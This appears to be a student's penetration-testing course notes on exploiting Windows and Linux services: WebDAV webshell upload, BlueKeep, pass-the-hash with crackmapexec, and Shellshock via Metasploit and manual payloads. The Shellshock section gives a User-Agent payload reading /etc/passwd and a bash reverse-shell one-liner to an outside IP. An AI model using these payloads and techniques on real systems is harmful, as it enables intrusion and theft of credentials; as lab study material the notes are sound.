# Vulnerability Assessment

Types of windows Vul
- Info disclosure
- Buffer overflows
- Remote Code Execution
- privilege escalation
- DOS

Frequently Exploited Win Native Services
- Microsoft IIS
- WebDAV
- SMB/CIFS
- RDP
- WinRM

**Vul scan with MSF**

**Ultra Useful MSF plugin: metasploit-autopwn**
To load it into msf use the following command
- wget the .rb file
- mv db_autopwn.rb /usr/share/metasploit-framewaork/plugins/
- Inside msfconsole: load db_autopwn (it only works when you got all the service info and host is in the postgredb database, so first do your nmap scans and load it in before using)
- There will be tons of exploit showing up, so be specific like: `db_autopwn -p -t -PI 445`
- `analyze` command will give you recommendations and `vulns` to detect vulnerabilities, it will show the CVEs


### Exploiting Microsoft IIS WebDAV

- IIS is basically a web server developed by microsoft for windows, typically run 80/443 without SSL/with SSL
- WebDav usually run on IIS or apache

**Exploitation Summary**
1. identify if the WebDAV has been configured to run on IIS web server
2. perform a brute-force attack on the server to obtain legitimate credentials
3. we can then authenticate with the WebDAV server and upload malicious .asp payload to get reverse shell
4. use `davtest` upload webshell eg: `davtest -auth username:password -url http://IP/webdav` to do a check to see what file can we upload
5. `cadaver` to upload files `cadaver http://IP/webdav`
6. kali comes with build in webshells at `/usr/share/webshells/`
7. in cadaver we say `put /usr/share/webshells/asp/webshell.asp`


### CVE-2019-0708 BlueKeep

- exploit RDP to gain remotely execute arbitrary code
- gain access to a chunk of kernel memory
- this module in msf will only work in x64 windows
- this module will need to set the target windows version manually

### WinRM (Pass-The-Hash-Attack) Named badblue in msf

- A technique that use to havest NTLM hashes or clear text passwords
- There are many Pass the hash attacks but will demonstrate: msf PsExec module and Crackmapexec
- after initial foothold: `load kiwi` to gain hash
- `crackmapexec smb <IP> -u <username> -p/-H <password or hash depending on the flag set before> -x <command to execute>`

### Frequently Exploited Linux Services

- Apache
- SSH
- FTP
- SAMBA

### Exploiting Bash CVE-2014-6271 Shellshock

- Remote Arbitrary commands via Bash
- 2 components are Bash and Apache
- apache web servers configured to run CGI (Common Gateway Interface) scripts or .sh scripts are also vulnerable to this attack (Injection attack: Inject command we want after those special chars)
- The core of this vul is caused by Bash where Bash mistakenly executes trailing commands after a series of char: () {:;};


DEMO:

The web page below has the /gettime.cgi script

```
<!DOCTYPE html>
<html>
<head>
<style>
body { 
    background-image: url('static/images/background.jpg');
    background-repeat: no-repeat;
    background-attachment: fixed;
    background-position: center; 
}
</style>
	<script>
	   setInterval(function() { 
		var xhttp = new XMLHttpRequest();
		xhttp.onreadystatechange = function() {
			if (this.readyState == 4 && this.status == 200) {
				document.getElementById("output").innerHTML = this.responseText;
			}
		};
		xhttp.open("GET", "/gettime.cgi", true);
		xhttp.send();
	    }, 1000);
	</script>

</head>
<body>
	<div style="position:fixed;top:67%;left:40%" id="output" ></div>
</body>
</html>
```

Next we would like to see if the machine is vul to shellshock vulnerability, we can use `nmap -sV --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi"` //script argument is to specify the location of the script

- We then use Burp Suite to intercept the website and change the user-agent to `() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'`
- As the response shows the passwd file, we can open a nc listening and instead use a reverse shell 1 liner `bash -i>&/dev/tcp/192.24.241.2/1234 0>&1`

msf way
- use module `exploit/multi/http/apache_mod_cgi_bash_env_exec`


### Vul scan with Nessus

- great thing with Nessus is that we can scan and put it into msfconsole
- nussus will first do host discovery before a scan
- To import scans into msf, just type db_import <location of nessus scans, in XML format, extension .nessus>
- a tip is to search in msf `search cve:2017 name:smb`

### Web APP with WMAP

- A powerful web app vuln scanner that can automate web server enumeration and identify vuln
- It is available as MSF plugin by default and is fully integrated with MSF
- to load the plugin just do `load wmap` in msfconsole
- do `wmap_<tab>` to see all commands available for us
- for wmap_targets, rmb to type full url (http://IP)
- wmap_run -t to check what modules will be used on target
- wmap_run -e to run
